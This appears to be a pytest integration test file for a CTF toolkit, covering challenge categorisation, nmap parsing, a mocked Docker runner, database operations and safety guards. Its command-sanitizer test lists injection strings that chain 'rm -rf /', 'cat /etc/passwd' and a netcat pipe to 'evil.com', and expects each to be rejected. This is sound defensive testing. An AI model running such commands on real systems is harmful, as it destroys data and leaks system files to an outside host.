"""End-to-end integration tests for CTF Toolkit."""

import asyncio
import pytest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch


class TestEndToEndWorkflow:
    """Test complete CTF workflow from input to flag capture."""

    @pytest.mark.asyncio
    async def test_challenge_analysis_workflow(self):
        """Test complete challenge analysis workflow."""
        from src.ctf_core.agents.auto_prompter import AutoPrompter
        
        # Test various challenge inputs
        test_cases = [
            (
                "Web challenge at 10.10.10.10 with SQL injection on /login",
                "web",
                "sql",  # Check for "sql" in the suspected_vuln
            ),
            (
                "Pwn challenge with buffer overflow in ./binary",
                "pwn",
                "buffer",
            ),
            (
                "Forensics challenge with memory dump analysis",
                "forensics",
                "memory",
            ),
            (
                "Crypto challenge with RSA encryption",
                "crypto",
                "rsa",
            ),
        ]
        
        prompter = AutoPrompter()
        
        for input_text, expected_category, expected_vuln_keyword in test_cases:
            analysis = prompter.analyze_input(input_text)
            
            assert analysis["category"] == expected_category, \
                f"Expected category '{expected_category}', got '{analysis['category']}'"
            
            # Check that the suspected_vuln contains the keyword (if not None)
            suspected_vuln = analysis.get("suspected_vuln")
            if suspected_vuln is not None:
                assert expected_vuln_keyword in suspected_vuln.lower(), \
                    f"Expected '{expected_vuln_keyword}' in '{suspected_vuln}'"
            else:
                # Some categories may not have a specific vulnerability detected
                # This is acceptable for basic category detection
                pass

    @pytest.mark.asyncio
    async def test_nmap_to_database_workflow(self):
        """Test complete nmap scan to database storage workflow."""
        from src.ctf_core.parsers.nmap_parser import parse_nmap_xml, format_for_database
        
        # Simulate nmap output
        nmap_xml = """<?xml version="1.0"?>
        <nmaprun>
            <host>
                <address addr="10.10.10.10" addrtype="ipv4"/>
                <ports>
                    <port protocol="tcp" portid="22">
                        <state state="open"/>
                        <service name="ssh" product="OpenSSH"/>
                    </port>
                    <port protocol="tcp" portid="80">
                        <state state="open"/>
                        <service name="http" product="Apache" version="2.4.49"/>
                    </port>
                </ports>
            </host>
        </nmaprun>"""
        
        # Parse and format
        parsed = parse_nmap_xml(nmap_xml)
        actions = format_for_database(parsed)
        
        # Verify structure
        assert len(actions) >= 2  # Target + services
        assert actions[0]["type"] == "target"
        assert any(a["type"] == "service" for a in actions)

    @pytest.mark.asyncio
    async def test_tool_execution_pipeline(self):
        """Test complete tool execution pipeline."""
        from src.ctf_core.docker_runner import DockerRunner
        import docker.errors
        from src.ctf_core.platform import PlatformInfo, PlatformType
        
        # Mock Docker client with proper exception handling
        with patch('src.ctf_core.docker_runner.docker') as mock_docker, \
             patch('src.ctf_core.docker_runner.get_platform') as mock_get_platform:
            
            # Set up platform mock
            mock_platform_info = MagicMock(spec=PlatformInfo)
            mock_platform_info.platform = PlatformType.WINDOWS
            mock_platform_info.wsl_available = False
            mock_platform_info.get_docker_socket.return_value = None
            mock_get_platform.return_value = mock_platform_info
            
            mock_client = MagicMock()
            mock_docker.from_env.return_value = mock_client
            
            # Set up the mock's errors module with the real exception class
            # This is needed because docker_runner.py catches docker.errors.APIError
            mock_docker.errors = MagicMock()
            mock_docker.errors.APIError = docker.errors.APIError
            mock_docker.errors.NotFound = docker.errors.NotFound
            
            mock_container = MagicMock()
            mock_client.containers.run.return_value = mock_container
            
            # Configure logs mock for streaming call (stdout=True, stderr=True, stream=True, follow=True)
            def logs_side_effect(**kwargs):
                if kwargs.get('stream'):
                    return iter([b"test output"])
                if kwargs.get('stdout') and not kwargs.get('stderr'):
                    return b"test output"
                elif kwargs.get('stderr') and not kwargs.get('stdout'):
                    return b""
                return b""
            
            mock_container.logs.side_effect = logs_side_effect
            mock_container.wait.return_value = {"StatusCode": 0}
            
            runner = DockerRunner()
            result = await runner.run_tool("nmap", ["10.10.10.10"])
            
            assert result["exit_code"] == 0
            assert result["stdout"] == "test output"


class TestSecurityControls:
    """Test security controls and safeguards."""

    @pytest.mark.asyncio
    async def test_command_injection_prevention_raises_error(self):
        """Test that command injection raises ValueError."""
        from src.ctf_core.utils.sanitize import sanitize_command
        
        # Test various injection attempts - should raise ValueError
        injection_attempts = [
            ["10.10.10.10; rm -rf /"],
            ["10.10.10.10 && cat /etc/passwd"],
            ["10.10.10.10 | nc evil.com 4444"],
        ]
        
        for args in injection_attempts:
            with pytest.raises(ValueError, match="dangerous pattern"):
                sanitize_command("nmap", args)

    @pytest.mark.asyncio
    async def test_sudo_prompt_detection(self):
        """Test sudo prompt detection works."""
        from src.ctf_core.utils.sudo_guard import detect_sudo_prompt
        
        test_cases = [
            ("[sudo] password for user:", True),
            ("Password:", True),
            ("Enter password:", True),
            ("Normal output here", False),
            ("", False),
        ]
        
        for stderr, expected in test_cases:
            result = detect_sudo_prompt(stderr)
            assert result == expected, f"Failed for: {stderr}"

    @pytest.mark.asyncio
    async def test_network_failure_detection(self):
        """Test network failure detection works."""
        from src.ctf_core.utils.net_guard import detect_network_failure
        
        # The function returns a string message for network failures, None otherwise
        test_cases = [
            ("Connection refused", True),  # Matches "connection refused"
            ("Network unreachable", True),  # Matches "network unreachable"
            ("could not resolve hostname", True),  # Matches "could not resolve"
            ("Normal output", False),
        ]
        
        for output, should_detect in test_cases:
            result = detect_network_failure(output)
            if should_detect:
                assert result is not None, f"Should detect network failure in: {output}"
                assert len(result) > 0
            else:
                assert result is None, f"Should not detect failure in: {output}"


class TestDatabaseOperations:
    """Test database operations in integration context."""

    @pytest.mark.asyncio
    async def test_database_crud_operations(self):
        """Test complete CRUD operations on database."""
        import aiosqlite
        from src.ctf_core.db import CTFDatabase
        
        # Use in-memory database for testing
        db = await aiosqlite.connect(":memory:")
        try:
            # Initialize schema
            with open("schema/init_db.sql") as f:
                schema = f.read()
            await db.executescript(schema)
            await db.commit()
            
            # Create database wrapper with the connection
            ctf_db = CTFDatabase(":memory:")
            ctf_db._db = db  # Inject the connection
            ctf_db._db.row_factory = aiosqlite.Row
            
            # Create
            target_id = await ctf_db.insert_target("10.10.10.10", "test-host", "linux")
            assert target_id is not None
            
            # Read
            targets = await ctf_db.get_targets()
            assert len(targets) == 1
            assert targets[0]["ip_address"] == "10.10.10.10"
            
            # Insert service
            await ctf_db.insert_service(target_id, 22, "tcp", "ssh", "OpenSSH")
            
            # Verify
            services = await ctf_db.get_services(target_id)
            assert len(services) == 1
            assert services[0]["port"] == 22
            
            # Log action
            await ctf_db.log_action(
                tool_used="nmap",
                command_string="nmap -sV 10.10.10.10",
                reason="Initial scan",
                target_id=target_id,
            )
            
            actions = await ctf_db.get_recent_actions()
            assert len(actions) == 1
        finally:
            await db.close()


class TestDockerImageVerification:
    """Test Docker image verification functionality."""

    @pytest.mark.asyncio
    async def test_verify_images_with_all_images_present(self):
        """Test verify_images returns success when all images exist."""
        from src.ctf_core.docker_runner import DockerRunner
        import docker.errors
        from src.ctf_core.platform import PlatformInfo, PlatformType

        with patch('src.ctf_core.docker_runner.docker') as mock_docker, \
             patch('src.ctf_core.docker_runner.get_platform') as mock_get_platform:

            # Set up platform mock
            mock_platform_info = MagicMock(spec=PlatformInfo)
            mock_platform_info.platform = PlatformType.WINDOWS
            mock_platform_info.wsl_available = False
            mock_platform_info.get_docker_socket.return_value = None
            mock_get_platform.return_value = mock_platform_info

            mock_client = MagicMock()
            mock_docker.from_env.return_value = mock_client

            # Set up docker.errors
            mock_docker.errors = MagicMock()
            mock_docker.errors.APIError = docker.errors.APIError
            mock_docker.errors.NotFound = docker.errors.NotFound

            # Mock images.get to return successfully (image exists)
            mock_client.images.get.return_value = MagicMock()

            runner = DockerRunner()
            success, missing = runner.verify_images()

            assert success is True
            assert missing == []

    @pytest.mark.asyncio
    async def test_verify_images_with_missing_images(self):
        """Test verify_images returns missing images when they don't exist."""
        from src.ctf_core.docker_runner import DockerRunner
        import docker.errors
        from src.ctf_core.platform import PlatformInfo, PlatformType

        with patch('src.ctf_core.docker_runner.docker') as mock_docker, \
             patch('src.ctf_core.docker_runner.get_platform') as mock_get_platform:

            # Set up platform mock
            mock_platform_info = MagicMock(spec=PlatformInfo)
            mock_platform_info.platform = PlatformType.WINDOWS
            mock_platform_info.wsl_available = False
            mock_platform_info.get_docker_socket.return_value = None
            mock_get_platform.return_value = mock_platform_info

            mock_client = MagicMock()
            mock_docker.from_env.return_value = mock_client

            # Set up docker.errors
            mock_docker.errors = MagicMock()
            mock_docker.errors.APIError = docker.errors.APIError
            mock_docker.errors.NotFound = docker.errors.NotFound

            # Mock images.get to raise NotFound for missing images
            mock_client.images.get.side_effect = docker.errors.NotFound("Image not found")

            runner = DockerRunner()
            success, missing = runner.verify_images()

            assert success is False
            assert len(missing) > 0

    def test_list_available_images(self):
        """Test list_available_images returns expected Docker images."""
        from src.ctf_core.docker_runner import DockerRunner, TOOL_IMAGES
        import docker.errors
        from src.ctf_core.platform import PlatformInfo, PlatformType

        with patch('src.ctf_core.docker_runner.docker') as mock_docker, \
             patch('src.ctf_core.docker_runner.get_platform') as mock_get_platform:

            # Set up platform mock
            mock_platform_info = MagicMock(spec=PlatformInfo)
            mock_platform_info.platform = PlatformType.WINDOWS
            mock_platform_info.wsl_available = False
            mock_platform_info.get_docker_socket.return_value = None
            mock_get_platform.return_value = mock_platform_info

            mock_docker.from_env.return_value = MagicMock()

            runner = DockerRunner()
            images = runner.list_available_images()

            # Should return unique image names
            assert len(images) > 0
            assert len(images) == len(set(images))  # All unique

